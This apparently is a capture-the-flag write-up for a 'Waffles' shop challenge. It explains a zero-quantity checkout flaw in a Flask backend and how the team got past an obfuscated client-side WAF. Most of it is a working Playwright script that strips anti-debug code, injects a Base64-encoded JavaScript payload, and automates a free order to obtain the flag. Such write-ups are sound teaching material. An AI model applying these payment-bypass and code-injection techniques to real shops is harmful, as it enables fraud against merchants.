# ﷽
Hey there!

This is a writeup of the Waffles Challenge.

This challenge involved working on a client-side WAF that was obfuscated and generated on-the-fly, without any source code of said WAF. And a simple Flask vulnerabillity allowing us to successfully order without payment processing.

**1. The Backend Vulnerability:**
The Flask vulnerability was in the server-side checkout logic. It did not correctly validate the contents of the shopping basket.
### Exploit Logic
1. The user creates a basket,
2. The user adds a product with a `quantity` of `0` via the API, and proceed to checkout.
3. The server would then calculate the total as `0.0`, approve the "free" order, and provide the flag in the successful order confirmation.

A simple Python script demonstrated this works perfectly when run locally against the server without the WAF.

**2. The Client-Side WAF:**
The live challenge was protected by a heavily obfuscated JavaScript file (`fetch.js`). The team's journey revolved around reverse-engineering and bypassing this WAF. Its key mechanisms were:
*   **Request Encryption:** It monkey-patches the global `window.fetch` function. Before sending any request with a body, it XOR-encrypts the body with a dynamic key.
*   **Dynamic Key:** The encryption key is provided by the server in a `Set-Cookie` header for a cookie named `x`. This key appears to change frequently, making static replay attacks difficult.
*   **Fingerprinting:** The script contained extensive browser and environment fingerprinting, likely to detect and block automated tools like `curl` or headless browsers not configured correctly.
*   **Anti-Debugging:** The code had measures to detect if the developer tools were open.

**3. The Solution's Journey:**
The team's path to the solution was a classic example of collaborative debugging:
*   **Initial Discovery:** They found a `.map` file for `fetch.js`, which provided the deobfuscated source code for the encryption logic. This was the first major breakthrough.
*   **The Strategy:** They correctly decided that instead of trying to perfectly re-implement the entire WAF and its fingerprinting in an external script, it would be easier to use a browser automation framework (Puppeteer, then ported to Playwright) to manage a real browser instance. This let the browser handle the fingerprinting and key generation naturally.
*   **The Injection Payload:** The core idea was to intercept the initial HTML page, remove the site's anti-hacking `document.write` calls, and inject their own JavaScript payload into the `bootstrapping.onload` event. This payload would automate the three required API calls: create basket, add product (with quantity 0), and checkout.
*   **Debugging the 400 Errors:** Their injected script was consistently met with `400 Bad Request` errors. They cycled through several brilliant but ultimately incorrect theories:
    1.  **Key Rotation:** They built a robust system to reload the page on a 400 error, using cookies to save their progress.
    2.  **`Content-Type` Mismatch:** They correctly identified that the server required `application/json` and fixed their payload to include it.
*   **The "Aha!" Moment:** The final breakthrough came from comparing the local working Python exploit to the failing JavaScript. The Python code used `r.json()` to get the session ID, while the JavaScript used `response.text()`. The server was returning the session ID as a JSON *string* (e.g., `"the-real-id"`). `response.text()` was capturing the quotes, corrupting the `X-Session-ID` header on subsequent requests. Changing to `response.json()` fixed everything.

### Final Working Exploit

This is the final version of the Python script using Playwright. It intercepts the page, injects a Base64-encoded JavaScript payload that contains the complete, corrected exploit logic, and successfully retrieves the flag by automating the process within the target's own environment.

```python
# puppeteer_proxy_logger.py
import asyncio
import base64
from playwright.async_api import async_playwright
import json
import re

def xor_decrypt(base64_data: str, key: str) -> bytes:
    """Helper function to decrypt XOR-encrypted data for logging purposes."""
    binary = base64.b64decode(base64_data)
    out = bytearray(len(binary))
    for i in range(len(binary)):
        out[i] = binary[i] ^ ord(key[i % len(key)])
    return out

async def main():
    async with async_playwright() as pw:
        browser = await pw.chromium.launch(headless=False, args=["--disable-web-security"])
        page = await browser.new_page()

        # --- JavaScript Exploit Payload with all fixes ---
        # This automates the exploit, handles 400 errors by reloading, and correctly parses the session ID.
        exploit_payload = """
            setTimeout(() => {
                // --- Setup for writing visible output to the HTML page ---
                document.body.innerHTML = '<h1>Exploit Initializing...</h1><pre id="exploit-log" style="white-space: pre-wrap; word-break: break-all; border: 1px solid #ccc; padding: 10px;"></pre>';
                const logElement = document.getElementById('exploit-log');
                const logToPage = (message) => {
                    if (typeof message === 'object') {
                        logElement.textContent += JSON.stringify(message, null, 2) + '\\n';
                    } else {
                        logElement.textContent += message + '\\n';
                    }
                };

                // --- Cookie-based State Management to survive page reloads ---
                const setProgress = (step, sessionId) => {
                    const state = { step, sessionId, timestamp: Date.now() };
                    document.cookie = `exploit_progress=${JSON.stringify(state)};path=/`;
                    logToPage(`[+] Progress saved: At step '${step}'.`);
                };

                const getProgress = () => {
                    const match = document.cookie.match(/exploit_progress=([^;]+)/);
                    if (match) {
                        try { return JSON.parse(match[1]); } catch (e) { return null; }
                    }
                    return null;
                };

                const clearProgress = () => {
                    logToPage('[+] Clearing progress cookie.');
                    document.cookie = 'exploit_progress=;path=/;expires=Thu, 01 Jan 1970 00:00:00 GMT';
                };

                // --- Main Exploit Logic ---
                (async () => {
                  const BASE = "https://waffles.challs.brunnerne.xyz";
                  let session_id;
                  
                  try {
                    const progress = getProgress();
                    let currentStep = progress ? progress.step : 'createBasket';
                    session_id = progress ? progress.sessionId : null;
                    
                    document.querySelector('h1').textContent = `Exploit Running... (State: ${currentStep})`;
                    if (progress) {
                        logToPage(`[!] Resuming from saved progress at step: ${currentStep}`);
                    }

                    // STEP 1: Create Basket
                    if (currentStep === 'createBasket') {
                        logToPage("[*] Step 1: Creating basket...");
                        const response = await fetch(`${BASE}/api/basket`, { method: "POST" });
                        if (!response.ok) throw new Error(`Failed to create basket: ${response.status}`);
                        
                        // ===== THE CRITICAL FIX IS HERE =====
                        // The server returns the ID as a JSON string (e.g., "id-value").
                        // .json() correctly decodes this, while .text() would include the quotes.
                        session_id = await response.json();
                        
                        logToPage(`[*] New Session ID: ${session_id}`);
                        currentStep = 'addProduct';
                    }

                    // STEP 2: Add Product
                    if (currentStep === 'addProduct') {
                        logToPage(`[*] Step 2: Adding product with quantity 0...`);
                        const response = await fetch(`${BASE}/api/basket/add`, {
                          method: "POST",
                          headers: { "X-Session-ID": session_id, "Content-Type": "application/json" },
                          body: JSON.stringify({ product_id: 1, quantity: 0 })
                        });

                        if (response.status === 400) {
                            logToPage('[!] Received status 400. Saving progress and reloading page...');
                            setProgress('addProduct', session_id);
                            location.reload();
                            return; // Stop execution to allow page reload
                        }
                        if (!response.ok) throw new Error(`Failed to add product: ${response.status}`);
                        
                        const basket = await response.json();
                        logToPage("[+] Product added successfully. Basket state:");
                        logToPage(basket);
                        currentStep = 'checkout';
                    }

                    // STEP 3: Checkout
                    if (currentStep === 'checkout') {
                        logToPage(`[*] Step 3: Checking out...`);
                        const response = await fetch(`${BASE}/api/checkout`, {
                          method: "POST",
                          headers: { "X-Session-ID": session_id, "Content-Type": "application/json" },
                          body: JSON.stringify({})
                        });

                        if (response.status === 400) {
                            logToPage('[!] Received status 400 at checkout. Saving progress and reloading...');
                            setProgress('checkout', session_id);
                            location.reload();
                            return;
                        }
                        if (!response.ok) throw new Error(`Checkout failed: ${response.status}`);
                        
                        const data = await response.json();
                        logToPage("[*] Checkout response:");
                        logToPage(data);

                        if ("order_id" in data) {
                          logToPage("=====================================");
                          logToPage("✅ FLAG FOUND ✅");
                          logToPage(data.order_id);
                          logToPage("=====================================");
                          document.querySelector('h1').textContent = 'Exploit Complete: FLAG FOUND!';
                          clearProgress(); // Success! Clean up.
                        } else {
                          throw new Error("Checkout succeeded but no flag was found.");
                        }
                    }

                  } catch (err) {
                    logToPage("FATAL ERROR during workflow: " + err.message);
                    document.querySelector('h1').textContent = 'Exploit FAILED!';
                    clearProgress(); // Clean up on failure to prevent loops
                  }
                })();
            }, 3000);
        """

        # --- Create the final script to inject ---
        # 1. Encode the main payload into Base64 to ensure it's a safe, single-line string for injection.
        encoded_exploit = base64.b64encode(exploit_payload.encode('utf-8')).decode('ascii')
        
        # 2. Create a simple, one-line decoder/executor script.
        injector_script = f"const b64='{encoded_exploit}';new Function(atob(b64))();"

        async def log_and_modify_request(route, request):
            url = request.url
            if url.endswith("/.well-known/appspecific.com.chrome.devtools.json"):
                await route.fulfill(status=404, content_type="text/plain", body="Not Found")
                return

            print("=" * 80)
            print(f"➡️  REQUEST: {request.method} {url}")
            if request.post_data:
                cookies = await page.context.cookies()
                x_cookie = next((c['value'] for c in cookies if c['name'] == 'x'), None)
                if x_cookie:
                    try:
                        decrypted_bytes = xor_decrypt(request.post_data, x_cookie)
                        print("   🔓 Decrypted Body (hex):", decrypted_bytes.hex())
                    except Exception as e:
                        print("   (Couldn't decrypt body)", str(e))
            
            try:
                response = await route.fetch()
                if response.headers.get("content-type", "").startswith("text/html"):
                    body = await response.text()
                    
                    # Remove anti-debug / anti-hacker scripts from the page
                    body = re.sub(r'document\.open\(\);\s*document\.write\(t\);\s*document\.close\(\);', '', body, flags=re.DOTALL)
                    body = re.sub(r'document\.open\(\);\s*document\.write\("Oi! You hacker types are not welcome!"\);\s*document\.close\(\);', '', body, flags=re.DOTALL)
                    
                    # Find the injection point in the original script
                    pattern = re.compile(r"(bootstrapping\.onload\s*=\s*\(\)\s*=>\s*\{)")
                    if pattern.search(body):
                        # Inject our safe, one-line Base64 decoder script
                        body = pattern.sub(r"\1" + injector_script, body, count=1)
                        print("   ✨ Injected final Base64-encoded exploit.")
                    else:
                        print("   (Could not find bootstrapping.onload to inject script)")

                    await route.fulfill(response=response, body=body)
                else:
                    await route.fulfill(response=response)
            except Exception as e:
                print(f"   (Could not modify response for {url}: {e})")
                await route.continue_()

        await page.route("**/*", log_and_modify_request)

        # Basic response logger
        async def log_response(response):
            try:
                print("-" * 80)
                print(f"⬅️  RESPONSE: {response.status} {response.url}")
            except Exception as e:
                print("Error logging response:", e)

        page.on("response", log_response)

        print("\n[+] Starting exploit...")
        await page.goto("https://waffles.challs.brunnerne.xyz/", wait_until="networkidle")
        print("\n✅ Verbose proxy logging started. JS modifications and injections are active.\n")
        print(">>> Check the browser page for the exploit script output. The page will reload if it hits a 400 error. <<<")

        # Keep the browser open so we can see the result.
        await asyncio.Event().wait()

if __name__ == "__main__":
    print("To run this script, you need Playwright: pip install playwright")
    print("You also need to install its browsers: python -m playwright install chromium")
    asyncio.run(main())
```
